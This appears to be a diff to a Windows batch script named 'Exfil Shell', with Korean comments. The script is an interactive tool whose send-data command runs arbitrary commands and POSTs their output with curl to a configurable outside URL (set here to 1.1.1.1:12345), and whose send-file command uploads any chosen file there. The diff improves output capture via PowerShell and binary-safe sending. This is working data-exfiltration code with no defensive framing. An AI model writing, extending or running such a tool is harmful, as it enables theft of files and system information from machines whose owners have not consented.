@@ -13,7 +13,7 @@ set "RED=%ESC%[31m"
 set "YELLOW=%ESC%[33m"
 set "RESET=%ESC%[0m"
 
-set BASE_URL=http://0.0.0.0:12345
+set BASE_URL=http://1.1.1.1:12345
 
 echo ==========================================
 echo   Exfil Shell  ^|  !BASE_URL!
@@ -35,7 +35,7 @@ if not defined INPUT goto loop
 :: exit
 if /i "!INPUT!"=="exit" goto :end
 
-:: set-url (데이터를 전송할 URL/PORT 입력)
+:: ── set-url ───────────────────────────────
 set "MATCHED="
 echo(!INPUT! | findstr /i "^set-url" > nul && set "MATCHED=1"
 if defined MATCHED (
@@ -50,7 +50,7 @@ if defined MATCHED (
     goto loop
 )
 
-:: send-data
+:: ── send-data ─────────────────────────────
 set "MATCHED="
 echo(!INPUT! | findstr /i "^send-data" > nul && set "MATCHED=1"
 if defined MATCHED (
@@ -61,23 +61,27 @@ if defined MATCHED (
         goto loop
     )
 
+    :: 파일명 결정
     for /f "tokens=1" %%a in ("!CMD!") do set "BIN=%%a"
+    set "FNAME=!BIN!.txt"
     echo(!BIN! | findstr /i "\." > nul
-    if !errorlevel!==0 ( set "FNAME=!BIN!" ) else ( set "FNAME=!BIN!.txt" )
+    if !errorlevel!==0 set "FNAME=!BIN!"
 
+    :: PowerShell로 실행 → Out-String으로 줄바꿈 보존 → 임시 파일 저장
     set "TMPFILE=%TEMP%\exfil_tmp.txt"
-    echo ===cmd: !CMD!=== > "!TMPFILE!"
-    !CMD! >> "!TMPFILE!" 2>&1
+    powershell -NoProfile -Command "$h='===cmd: !CMD!==='; $r = (!CMD! | Out-String); ($h + \"`r`n\" + $r) | Set-Content -Encoding UTF8 '!TMPFILE!'"
 
-    curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! -d @"!TMPFILE!" > "%TEMP%\status.txt" 2> "%TEMP%\curl_err.txt"
-    if !errorlevel! neq 0 (
-        set /p "CURL_ERR="<"%TEMP%\curl_err.txt"
+    :: --data-binary 로 줄바꿈 그대로 전송
+    curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! --data-binary @"!TMPFILE!" > "%TEMP%\exfil_status.txt" 2> "%TEMP%\exfil_err.txt"
+    set "CEL=!errorlevel!"
+    if !CEL! neq 0 (
+        set /p "CURL_ERR="<"%TEMP%\exfil_err.txt"
         echo !RED![-] curl error : !CURL_ERR!!RESET!
         del "!TMPFILE!" > nul 2>&1
         goto loop
     )
 
-    set /p "STATUS="<"%TEMP%\status.txt"
+    set /p "STATUS="<"%TEMP%\exfil_status.txt"
     if "!STATUS!"=="200" (
         echo !GREEN![+] Success : !FNAME! sent  ^| !BASE_URL!/!FNAME!!RESET!
     ) else (
@@ -87,7 +91,7 @@ if defined MATCHED (
     goto loop
 )
 
-:: send-file
+:: ── send-file ─────────────────────────────
 set "MATCHED="
 echo(!INPUT! | findstr /i "^send-file" > nul && set "MATCHED=1"
 if defined MATCHED (
@@ -104,14 +108,15 @@ if defined MATCHED (
 
     for %%a in ("!FPATH!") do set "FNAME=%%~nxa"
 
-    curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! -F "file=@!FPATH!" > "%TEMP%\status.txt" 2> "%TEMP%\curl_err.txt"
-    if !errorlevel! neq 0 (
-        set /p "CURL_ERR="<"%TEMP%\curl_err.txt"
+    curl.exe -s -o nul -w "%%{http_code}" -X POST !BASE_URL!/!FNAME! -F "file=@!FPATH!" > "%TEMP%\exfil_status.txt" 2> "%TEMP%\exfil_err.txt"
+    set "CEL=!errorlevel!"
+    if !CEL! neq 0 (
+        set /p "CURL_ERR="<"%TEMP%\exfil_err.txt"
         echo !RED![-] curl error : !CURL_ERR!!RESET!
         goto loop
     )
 
-    set /p "STATUS="<"%TEMP%\status.txt"
+    set /p "STATUS="<"%TEMP%\exfil_status.txt"
     if "!STATUS!"=="200" (
         echo !GREEN![+] Success : !FNAME! sent  ^| !BASE_URL!/!FNAME!!RESET!
     ) else (
